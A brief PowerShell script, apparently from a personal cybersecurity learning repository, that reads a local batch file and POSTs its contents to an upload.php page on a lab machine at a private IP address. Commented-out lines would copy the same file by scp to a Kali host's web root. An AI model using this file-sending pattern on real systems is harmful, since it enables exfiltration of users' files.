#write-output "sending the files"
#scp D:\programs\gitcyber\CyberToolsGuide\BatchScripting\Day10.bat kali@192.168.203.129:/var/www/html/

$file = "D:\programs\gitcyber\CyberToolsGuide\BatchScripting\Day10.bat"
$data = Get-Content $file -Raw

Invoke-WebRequest -Uri "http://192.168.203.129/upload.php" -Method POST -Body $data
